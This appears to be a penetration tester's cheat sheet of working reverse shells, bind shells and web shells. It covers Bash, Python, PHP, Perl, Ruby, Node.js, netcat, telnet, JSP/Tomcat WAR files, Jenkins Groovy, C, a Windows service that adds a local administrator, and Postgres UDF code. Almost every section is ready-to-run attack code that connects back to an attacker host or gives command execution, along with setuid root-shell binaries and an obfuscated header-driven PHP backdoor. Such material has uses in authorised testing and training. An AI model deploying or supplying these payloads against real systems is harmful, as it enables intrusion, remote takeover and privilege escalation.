Reverse shell, bind shell and web shell for all the things!
# Bash

```bash
exec /bin/bash 0&0 2>&0
```

```bash
0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
```

```bash
exec 5<>/dev/tcp/ATTACKING-IP/80
cat <&5 | while read line; do $line 2>&5 >&5; done

# or:

while read line 0<&5; do $line 2>&5 >&5; done
```

```bash
bash -i >& /dev/tcp/ATTACKING_IP/80 0>&1
/bin/bash -c 'bash -i >& /dev/tcp/ATTACKING_IP/443 0>&1'
```

# Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

# Socat

```bash
socat tcp:ip:port exec:'bash -i' ,pty,stderr,setsid,sigint,sane &
```

# Golang

```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go
```

- https://github.com/SaDs3c/goshell

# PHP

```php
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
```

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
<?php shell_exec('bash -i >& /dev/tcp/AttackerIP/port 0>&1');?>
```

```php
<?php -r '$sock=fsockopen("AttackerIP",port);exec("/bin/sh -i <&3 >&3 2>&3");'?>
<?php -r '$s=fsockopen("AttackerIP",port);shell_exec("/bin/sh -i <&3 >&3 2>&3");'?>
<?php -r '$s=fsockopen("AttackerIP",port);`/bin/sh -i <&3 >&3 2>&3`;'?>
<?php -r '$s=fsockopen("AttackerIP",port);system("/bin/sh -i <&3 >&3 2>&3");'?>
<?php -r '$s=fsockopen("AttackerIP",port);popen("/bin/sh -i <&3 >&3 2>&3", "r");'?>
```

Base64 encrypted

```php
<?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
```

# Netcat

- [Bind shell](../Tools/netcat.md#Bind%20shell)
- [Reverse shell](../Tools/netcat.md#Reverse%20shell)

```bash
/bin/sh | nc ATTACKING-IP 80
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING_IP 4444 0/tmp/p
```

OpbenBSD:

```bash
mkfifo /tmp/lol;nc ATTACKER_IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```

# Powershell

- [powercat](../Tools/powercat.md#shell)
- [Powershell for pentesters](Dev,%20ICT%20&%20Cybersec/Dev,%20scripting%20&%20OS/Powershell%20for%20pentesters.md#Shell)
- [Empire](../Tools/Empire.md)
- [powersploit](../Tools/powersploit.md)
- [nishang](https://github.com/samratashok/nishang)

# Node.js

```jsx
require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/80 0>&1');
```

```js
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "192.168.1.1", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();
```
# Telnet

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING_IP 80 0/tmp/p
```

```bash
telnet ATTACKING_IP 80 | /bin/bash | telnet ATTACKING_IP 443
```

# Perl

```perl
perl -e 'use Socket;$i="ATTACKING_IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Windows:

```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING_IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```perl
perl -e 'use Socket;$i="ATTACKING_IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

# Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

# Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

# JSP

```java
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```
## Tomcat (.war)

```bash
mkdir webshell
cp index.jsp webshell

cd webshell
jar -cvf ../webshell.war *
	added manifest
	adding: index.jsp(in = 579) (out= 351)(deflated 39%)
```

## Axis (.aar)

Minimal [[AXIS2]] webshell

```cardlink
url: https://github.com/Lexus89/AxisInvoker
title: "GitHub - Lexus89/AxisInvoker: Minimal AXIS2 webshell"
description: "Minimal AXIS2 webshell. Contribute to Lexus89/AxisInvoker development by creating an account on GitHub."
host: github.com
favicon: https://github.githubassets.com/favicons/favicon.svg
image: https://opengraph.githubassets.com/78e32670a32a1b76f36b1078425c0e9845fb3adb077a83480e6918387d5fb368/Lexus89/AxisInvoker
```

# C

Reverse shell:

```c
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h> 
#define REMOTE_ADDR "10.13.14.15"
#define REMOTE_PORT 443 
int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}

```

Spawn shell (only for suid root binaries because `system` drops effective uid and effective gid):

```c
// gcc -o /tmp/rootshell /tmp/rootshell.c
// chmod u+s /tmp/rootshell
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}
```

Spawn shell (for every suid user binary):

```c
#include <stdio.h>
#include <unistd.h>

int main(int argc, const char * argv[]){
	if (argc > 1) printf("%s", execvp(argv[1], &argv[1]));
	return 0;
}
```

```c
// gcc -o /tmp/rootshell /tmp/rootshell.c
// chmod u+s /tmp/rootshell
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
execlp("/bin/id", "id", NULL);
}
```

Windows command execution binary:
```c
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

//add the payload here
int Run()
{
system("cmd /k net localgroup administrators user /add");
return 0;
}

int main()
{
SERVICE_TABLE_ENTRY ServiceTable[2];
ServiceTable[0].lpServiceName = "MyService";
ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

ServiceTable[1].lpServiceName = NULL;
ServiceTable[1].lpServiceProc = NULL;

StartServiceCtrlDispatcher(ServiceTable);
return 0;
}

void ServiceMain(int argc, char** argv)
{
ServiceStatus.dwServiceType = SERVICE_WIN32;
ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
ServiceStatus.dwWin32ExitCode = 0;
ServiceStatus.dwServiceSpecificExitCode = 0;
ServiceStatus.dwCheckPoint = 0;
ServiceStatus.dwWaitHint = 0;

hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler);
Run();

ServiceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus (hStatus, &ServiceStatus);

while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
{
Sleep(SLEEP_TIME);
}
return;
}

void ControlHandler(DWORD request)
{
switch(request)
{
case SERVICE_CONTROL_STOP:
ServiceStatus.dwWin32ExitCode = 0;
ServiceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus (hStatus, &ServiceStatus);
return;

case SERVICE_CONTROL_SHUTDOWN:
ServiceStatus.dwWin32ExitCode = 0;
ServiceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus (hStatus, &ServiceStatus);
return;

default:
break;
}
SetServiceStatus (hStatus, &ServiceStatus);
return;
}
```

# Groovy (Jenkins)

Valid for [Jenkins](../Dev,%20scripting%20&%20OS/Jenkins.md)

Reverse Shell:

```java
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

RCE:

```python
def sout = new StringBuilder(), serr = new StringBuilder()
def proc = 'ls'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

# UDF Postgres

RCE:

```c
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"
#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif
/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum awae(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(awae);
/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
awae(PG_FUNCTION_ARGS)
{
/* convert text pointer to C string */
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout,
PointerGetDatum(textp)))
/* retrieve the second argument that is passed to the function (an integer)
that will serve as our counter limit*/
int instances = PG_GETARG_INT32(1);
for (int c = 0; c < instances; c++) {
/*launch the process passed in the first parameter*/
ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
}
PG_RETURN_VOID();
}
```

Reverse shell:

```c
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include <winsock2.h>
#include "utils/builtins.h"
#pragma comment(lib, "ws2_32")
#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif
/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum connect_back(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(connect_back);
WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;
Datum
connect_back(PG_FUNCTION_ARGS)
{
/* convert C string to text pointer */
#define GET_TEXT(cstrp) \
DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp)))
/* convert text pointer to C string */
#define GET_STR(textp) \
DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))
WSAStartup(MAKEWORD(2, 2), &wsaData);
s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL,
(unsigned int)NULL);
hax.sin_family = AF_INET;
/* FIX THIS */
hax.sin_port = XXXXXXXXXXXXX
/* FIX THIS TOO*/
hax.sin_addr.s_addr = XXXXXXXXXXXXXXX
WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
memset(&sui, 0, sizeof(sui));
sui.cb = sizeof(sui);
sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;
CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
PG_RETURN_VOID();
}
```